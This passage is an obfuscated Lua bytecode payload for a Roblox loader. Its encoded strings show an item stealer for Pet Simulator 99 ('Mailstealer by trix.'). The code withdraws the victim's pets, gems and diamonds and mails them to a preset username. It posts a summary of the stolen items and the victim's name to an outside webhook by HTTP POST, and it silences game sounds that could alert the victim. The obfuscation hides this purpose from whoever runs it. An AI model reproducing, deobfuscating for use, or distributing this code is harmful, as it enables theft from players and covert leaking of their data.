2900F500013Q0004283Q00F500010012790029004A4Q000C002A00284Q004400280029002A2Q000C002900283Q002016002A002500242Q004400290029002A001260002A004B3Q002016002A002A004C2Q000C002B00074Q007E002C3Q0005001024002C004D0020001024002C004E0024002016002D0025002600066E002D00022Q0100010004283Q00022Q01001279002D00213Q001024002C004F002D001024002C00500027001024002C005100292Q0062002A002C0001002016002A0025002600066E002A000A2Q0100010004283Q000A2Q01001279002A00214Q0043002A0027002A2Q001D00080008002A0004283Q00292Q012Q000C002600134Q000C002700204Q000C002800254Q0058002600280002001260002700073Q000607002700292Q0100260004283Q00292Q010012600027004B3Q00201600270027004C2Q000C002800074Q007E00293Q00050010240029004D00200010240029004E0024002016002A0025002600066E002A001E2Q0100010004283Q001E2Q01001279002A00213Q0010240029004F002A001024002900500026002016002A0025002400102400290051002A2Q006200270029000100201600270025002600066E002700272Q0100010004283Q00272Q01001279002700214Q00430027002600272Q001D00080008002700201600260025005200061E002600372Q013Q0004283Q00372Q012Q007E00263Q000200102400260021002400300300260047003400202C00273Q000F001279002900534Q005800270029000200202C002700270054001260002900554Q000C002A00264Q005E0029002A4Q007A00273Q000100061B002100C5000100020004283Q00C5000100061B001C00BE000100020004283Q00BE00012Q002B001C00073Q000E61001C00422Q01001C0004283Q00422Q01001260001C00074Q001D001C001C000B00063E001C00CE2Q01000C0004283Q00CE2Q012Q000C001C001A4Q004F001C000100012Q000C001C00184Q000B001C0001000200061E001C00712Q013Q0004283Q00712Q012Q0037000900013Q001260001C000C3Q00202C001C001C000D001279001E000E4Q0058001C001E000200202C001C001C000F001279001E00104Q0058001C001E000200202C001C001C000F001279001E00564Q0058001C001E0002001260001D00573Q001260001E00584Q0037001F00014Q005E001E001F4Q000D001D3Q001F0004283Q006E2Q01001260002200594Q000C002300214Q002F0022000200020026350022006E2Q01005A0004283Q006E2Q010012600022005B3Q00201600220022005C2Q000C002300213Q0012790024005D4Q00580022002400020026350022006E2Q0100590004283Q006E2Q012Q0076002200223Q0012600023005E4Q000C002400213Q0006660025000C000100022Q00713Q001C4Q00713Q00224Q00580023002500022Q000C002200234Q007B00225Q00061B001D00592Q0100020004283Q00592Q012Q007B001C6Q000C001C00194Q004F001C00010001001260001C00113Q001260001D000C3Q002016001D001D000E002016001D001D0012002016001D001D0013002016001D001D005F2Q002F001C00020002002016001C001C00602Q004F001C00010001001260001C00113Q001260001D000C3Q002016001D001D000E002016001D001D0012002016001D001D0013002016001D001D00612Q002F001C00020002002016001C001C00602Q004F001C00010001001260001C000C3Q00202C001C001C000D001279001E000E4Q0058001C001E000200202C001C001C000F001279001E00124Q0058001C001E000200202C001C001C000F001279001E00134Q0058001C001E000200202C001C001C000F001279001E00144Q0058001C001E0002001260001D00114Q000C001E001C4Q002F001D00020002002016001D001D00152Q000B001D00010002000212001E000D3Q001229001E00623Q001260001E00624Q000C001F001D4Q002F001E000200022Q000C001D001E3Q001260001E00114Q000C001F001C4Q002F001E00020002000666001F000E000100012Q00713Q001D3Q001024001E0015001F001260001E004B3Q002016001E001E00632Q000C001F00073Q0002120020000F4Q0062001E00200001001260001E00643Q000666001F0010000100032Q00713Q000E4Q00713Q00044Q00713Q000C4Q003F001E00020001001260001E00574Q000C001F00074Q0053001E000200200004283Q00BC2Q01002016002300220050000607000B00BE2Q0100230004283Q00BE2Q012Q000C002300163Q00201600240022004D00201600250022004E00201600260022004F2Q00620023002600010004283Q00BC2Q010004283Q00BE2Q0100061B001E00B22Q0100020004283Q00B22Q012Q000C001E00174Q004F001E00010001001260001E00113Q001260001F000C3Q002016001F001F000E002016001F001F0012002016001F001F0013002016001F001F00652Q002F001E00020002002016001F001E0066001279002000674Q003F001F00020001001260001F00683Q001279002000694Q003F001F000200012Q007B001C6Q00093Q00013Q00113Q00073Q0003073Q007265717569726503043Q0067616D6503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E7403043Q00536176652Q033Q00476574000B3Q0012603Q00013Q001260000100023Q0020160001000100030020160001000100040020160001000100050020160001000100062Q002F3Q000200020020165Q00072Q00643Q00014Q006C8Q00093Q00017Q000C3Q0003043Q006D61746803053Q00666C2Q6F72034Q0003013Q006B03013Q006D03013Q006203013Q0074026Q00F03F025Q00408F4003063Q00737472696E6703063Q00666F726D617403063Q00252E3266257301193Q001260000100013Q0020160001000100022Q000C00026Q002F0001000200022Q007E000200053Q001279000300033Q001279000400043Q001279000500053Q001279000600063Q001279000700074Q0030000200050001001279000300083Q000E2Q00090011000100010004283Q001100010020770001000100090020140003000300080004283Q000C00010012600004000A3Q00201600040004000B0012790005000C4Q000C000600014Q007C0007000200032Q0078000400074Q006C00046Q00093Q00017Q00333Q00030C3Q00436F6E74656E742D5479706503103Q00612Q706C69636174696F6E2F6A736F6E03043Q006E616D6503103Q0052657461726420557365726E616D653A03053Q0076616C756503063Q00696E6C696E652Q0103113Q004974656D7320746F2062652073656E743A034Q00010003083Q0053752Q6D6172793A03063Q0069706169727303063Q00616D6F756E742Q033Q0072617003053Q007461626C6503063Q00696E7365727403043Q00736F7274027Q00402Q033Q0020287803013Q002903023Q003A2003053Q00205241500A026Q00084003063Q0047656D733A2003013Q000A030B3Q00546F74616C205241503A20033E3Q002Q0A56696374696D20747269656420746F2075736520616E74692D6D61696C737465616C65722C2062757420676F74206675636B656420696E737465616403063Q00656D6265647303053Q007469746C6503173Q00F09F90B1204E65772050532Q3920457865637574696F6E03053Q00636F6C6F72025Q00E0EF4003063Q006669656C647303063Q00662Q6F74657203043Q007465787403143Q004D61696C737465616C657220627920747269782E026Q00904003063Q00676D6174636803063Q005B5E0D0A5D2B028Q0003063Q0072656D6F766503063Q00636F6E636174030B3Q000A506C7573206D6F726521030A3Q004A534F4E456E636F646503073Q00776562682Q6F6B03073Q00726571756573742Q033Q0055726C03063Q004D6574686F6403043Q00504F535403073Q004865616465727303043Q00426F647902B24Q007E00023Q00010030030002000100022Q007E000300034Q007E00043Q0003003003000400030004001024000400053Q0030030004000600072Q007E00053Q000300300300050003000800300300050005000900300300050006000A2Q007E00063Q000300300300060003000B00300300060005000900300300060006000A2Q00300003000300012Q007E00046Q007E00055Q0012600006000C4Q001100076Q00530006000200080004283Q002C0001002016000B000A00032Q007C000C0005000B00061E000C002100013Q0004283Q002100012Q007C000C0005000B2Q007C000D0005000B002016000D000D000D002016000E000A000D2Q001D000D000D000E001024000C000D000D0004283Q002C00012Q007E000C3Q0002002016000D000A000D001024000C000D000D002016000D000A000E001024000C000E000D2Q00190005000B000C001260000C000F3Q002016000C000C00102Q000C000D00044Q000C000E000B4Q0062000C000E000100061B00060016000100020004283Q001600010012600006000F3Q0020160006000600112Q000C000700043Q00066600083Q000100012Q00713Q00054Q00620006000800010012600006000C4Q000C000700044Q00530006000200080004283Q004900012Q007C000B0005000A002016000C00030012002016000D00030012002016000D000D00052Q000C000E000A3Q001279000F00133Q0020160010000B000D001279001100143Q001279001200154Q0011001300013Q0020160014000B000E0020160015000B000D2Q00430014001400152Q002F001300020002001279001400164Q0044000D000D0014001024000C0005000D00061B00060038000100020004283Q00380001002016000600030017002016000700030017002016000700070005001279000800184Q0011000900014Q000C000A00014Q002F000900020002001279000A00194Q004400070007000A0010240006000500070020160006000300170020160007000300170020160007000700050012790008001A4Q0011000900014Q0011000A00024Q002F0009000200022Q00440007000700090010240006000500072Q0011000600033Q00061E0006006700013Q0004283Q006700010020160006000300170020160007000300170020160007000700050012790008001B4Q00440007000700080010240006000500072Q007E00063Q00012Q007E000700014Q007E00083Q00040030030008001D001E0030030008001F00200010240008002100032Q007E00093Q00010030030009002300240010240008002200092Q00300007000100010010240006001C00070020160007000300120020160007000700052Q002B000700073Q000E3A0025009F000100070004283Q009F00012Q007E00075Q00201600080003001200201600080008000500202C000800080026001279000A00274Q003C0008000A000A0004283Q00830001001260000C000F3Q002016000C000C00102Q000C000D00074Q000C000E000B4Q0062000C000E000100061B0008007E000100010004283Q007E00010020160008000300120020160008000800052Q002B000800083Q000E3A0025009F000100080004283Q009F00012Q002B000800073Q000E3A0028009F000100080004283Q009F00010012600008000F3Q0020160008000800292Q000C000900074Q003F0008000200010020160008000300120012600009000F3Q00201600090009002A2Q000C000A00073Q001279000B00194Q00580009000B0002001024000800050009002016000800030012002016000900030012002016000900090005001279000A002B4Q004400090009000A0010240008000500090004283Q008500012Q0011000700043Q00202C00070007002C2Q000C000900064Q00580007000900020012600008002D3Q00061E000800B100013Q0004283Q00B100010012600008002D3Q002617000800B1000100090004283Q00B100010012600008002E4Q007E00093Q0004001260000A002D3Q0010240009002F000A0030030009003000310010240009003200020010240009003300072Q002F0008000200022Q00093Q00013Q00013Q00023Q002Q033Q0072617003063Q00616D6F756E7402144Q001100026Q007C000200023Q0020160002000200012Q001100036Q007C000300033Q0020160003000300022Q00430002000200032Q001100036Q007C0003000300010020160003000300012Q001100046Q007C0004000400010020160004000400022Q004300030003000400067300030011000100020004283Q001100012Q001F00026Q0037000200014Q001C000200024Q00093Q00017Q00013Q0003053Q0056616C756500044Q00118Q0011000100013Q0010243Q000100012Q00093Q00017Q00023Q0003073Q00456E61626C6564012Q00034Q00117Q0030033Q000100022Q00093Q00017Q000B3Q0003093Q00436C612Q734E616D6503053Q00536F756E6403073Q00536F756E64496403183Q00726278612Q73657469643A2Q2F2Q3138333931333235363503183Q00726278612Q73657469643A2Q2F313432353437323130333803183Q00726278612Q73657469643A2Q2F313234313334323332373603063Q00566F6C756D65028Q00030C3Q00506C61794F6E52656D6F7665010003073Q0044657374726F7901113Q00201600013Q000100263500010010000100020004283Q0010000100201600013Q00030026170001000C000100040004283Q000C000100201600013Q00030026170001000C000100050004283Q000C000100201600013Q000300263500010010000100060004283Q001000010030033Q000700080030033Q0009000A00202C00013Q000B2Q003F0001000200012Q00093Q00017Q000E3Q0003073Q007265717569726503043Q0067616D65030A3Q004765745365727669636503113Q005265706C69636174656453746F7261676503073Q004C69627261727903063Q00436C69656E74030A3Q00446576524150436D64732Q033Q0047657403053Q00436C612Q7303043Q004E616D652Q033Q0049734103053Q00476574496403083Q00537461636B4B6579028Q00021E3Q001260000200013Q001260000300023Q00202C000300030003001279000500044Q00580003000500020020160003000300050020160003000300060020160003000300072Q002F0002000200020020160002000200082Q007E00033Q00042Q007E00043Q00010010240004000A3Q00102400030009000400066600043Q000100012Q00717Q0010240003000B000400066600040001000100012Q00713Q00013Q0010240003000C000400066600040002000100022Q00758Q00713Q00013Q0010240003000D00042Q002F00020002000200066E0002001C000100010004283Q001C00010012790002000E4Q001C000200024Q00093Q00013Q00037Q0001074Q001100015Q0006553Q0004000100010004283Q000400012Q001F00016Q0037000100014Q001C000100024Q00093Q00017Q00013Q0003023Q00696400044Q00117Q0020165Q00012Q001C3Q00024Q00093Q00017Q00053Q00030A3Q004A534F4E456E636F646503023Q00696403023Q00707403023Q00736803023Q00746E00124Q00117Q00202C5Q00012Q007E00023Q00042Q0011000300013Q0020160003000300020010240002000200032Q0011000300013Q0020160003000300030010240002000300032Q0011000300013Q0020160003000300040010240002000400032Q0011000300013Q0020160003000300050010240002000500032Q00783Q00024Q006C8Q00093Q00017Q00103Q00026Q00F03F027Q0040026Q000840026Q001040026Q001440030C3Q0057616974466F724368696C64030D3Q004D61696C626F783A2053656E64030C3Q00496E766F6B6553657276657203063Q00756E7061636B0100031D3Q005468657920646F6E2774206861766520656E6F756768207370616365212Q0103043Q006D61746803043Q006365696C026Q00F83F024Q00D012534103324Q007E00033Q00052Q001100045Q0010240003000100042Q0011000400013Q001024000300020004001024000300033Q00102400030004000100061A0004000A000100020004283Q000A0001001279000400013Q0010240003000500042Q003700046Q0011000500023Q00202C000500050006001279000700074Q005800050007000200202C000500050008001260000700094Q000C000800034Q005E000700084Q000D00053Q00060026350005001D0001000A0004283Q001D00010026350006001D0001000B0004283Q001D00012Q0011000700034Q003400076Q001100075Q0010240003000100070026350005000C0001000C0004283Q000C00012Q0011000500044Q0011000600054Q006F0005000500062Q0034000500043Q0012600005000D3Q00201600050005000E0012600006000D3Q00201600060006000E2Q0011000700054Q002F00060002000200200100060006000F2Q002F0005000200022Q0034000500054Q0011000500053Q000E3A00100031000100050004283Q00310001001279000500104Q0034000500054Q00093Q00017Q00103Q0003053Q00706169727303093Q00496E76656E746F727903083Q0043752Q72656E637903023Q00696403083Q004469616D6F6E6473025Q0088C340026Q00F03F027Q0040026Q000840026Q001040026Q001440030C3Q0057616974466F724368696C64030D3Q004D61696C626F783A2053656E64030C3Q00496E766F6B6553657276657203063Q00756E7061636B2Q01002A3Q0012603Q00014Q001100016Q000B0001000100020020160001000100020020160001000100032Q00533Q000200020004283Q0027000100201600050004000400263500050027000100050004283Q002700012Q0011000500014Q0011000600023Q00201400060006000600060700060027000100050004283Q002700012Q007E00053Q00052Q0011000600033Q0010240005000700062Q0011000600043Q0010240005000800060030030005000900030010240005000A00032Q0011000600014Q0011000700024Q006F0006000600070010240005000B00062Q003700066Q0011000700053Q00202C00070007000C0012790009000D4Q005800070009000200202C00070007000E0012600009000F4Q000C000A00054Q005E0009000A4Q007D00073Q00020026350007001B000100100004283Q001B00010004283Q0029000100061B3Q0007000100020004283Q000700012Q00093Q00017Q000F3Q0003053Q0070616972732Q033Q00506574026Q00F03F03063Q00526F626C6F78027Q004003043Q0054657374026Q000840026Q001040026Q001440030C3Q0057616974466F724368696C64030D3Q004D61696C626F783A2053656E64030C3Q00496E766F6B6553657276657203063Q00756E7061636B031D3Q005468657920646F6E2774206861766520656E6F7567682073706163652103303Q00596F7520646F6E2774206861766520656E6F756768206469616D6F6E647320746F2073656E6420746865206D61696C2100223Q001260000100014Q001100025Q0020160002000200022Q00530001000200030004283Q000700012Q000C3Q00043Q0004283Q0009000100061B00010005000100020004283Q000500012Q007E00013Q0005003003000100030004003003000100050006003003000100070002001024000100083Q0030030001000900032Q0011000200013Q00202C00020002000A0012790004000B4Q005800020004000200202C00020002000C0012600004000D4Q000C000500014Q005E000400054Q000D00023Q00030026170003001C0001000E0004283Q001C00010026350003001F0001000F0004283Q001F00012Q003700046Q001C000400023Q0004283Q002100012Q0037000400014Q001C000400024Q00093Q00017Q00063Q002Q033Q00426F7803053Q0070616972732Q033Q005F7571030C3Q0057616974466F724368696C6403113Q00426F783A20576974686472617720412Q6C030C3Q00496E766F6B6553657276657200164Q00117Q0020165Q000100061E3Q001500013Q0004283Q001500010012603Q00024Q001100015Q0020160001000100012Q00533Q000200020004283Q0013000100201600050004000300061E0005001300013Q0004283Q001300012Q0011000500013Q00202C000500050004001279000700054Q005800050007000200202C0005000500062Q000C000700034Q006200050007000100061B3Q0009000100020004283Q000900012Q00093Q00017Q00053Q00030C3Q0057616974466F724368696C6403123Q004D61696C626F783A20436C61696D20412Q6C030C3Q00496E766F6B6553657276657203323Q00596F75206D7573742077616974203330207365636F6E6473206265666F7265207573696E6720746865206D61696C626F782103043Q007761697400144Q00117Q00202C5Q0001001279000200024Q00583Q0002000200202C5Q00032Q00533Q0002000100263500010013000100040004283Q00130001001260000200054Q004F0002000100012Q001100025Q00202C000200020001001279000400024Q005800020004000200202C0002000200032Q00530002000200032Q000C000100034Q000C3Q00023Q0004283Q000600012Q00093Q00017Q00013Q0003043Q007469636B010C4Q001100025Q0006203Q0006000100020004283Q00060001001260000200014Q0064000200014Q006C00026Q0011000200014Q000C00036Q000200046Q004900026Q006C00026Q00093Q00017Q00043Q0003053Q00706169727303043Q007479706503053Q007461626C6503083Q00642Q6570436F707901134Q007E00015Q001260000200014Q000C00036Q00530002000200040004283Q000F0001001260000700024Q000C000800064Q002F0007000200020026350007000E000100030004283Q000E0001001260000700044Q000C000800064Q002F0007000200022Q000C000600074Q001900010005000600061B00020005000100020004283Q000500012Q001C000100024Q00093Q00019Q003Q00034Q001100016Q001C000100024Q00093Q00017Q00023Q002Q033Q0072617003063Q00616D6F756E74020C3Q00201600023Q000100201600033Q00022Q00430002000200030020160003000100010020160004000100022Q004300030003000400067300030009000100020004283Q000900012Q001F00026Q0037000200014Q001C000200024Q00093Q00017Q00013Q0003043Q004E616D6500064Q00118Q0011000100013Q0020160001000100012Q0011000200024Q00623Q000200012Q00093Q00017Q00", GetFEnv(), ...);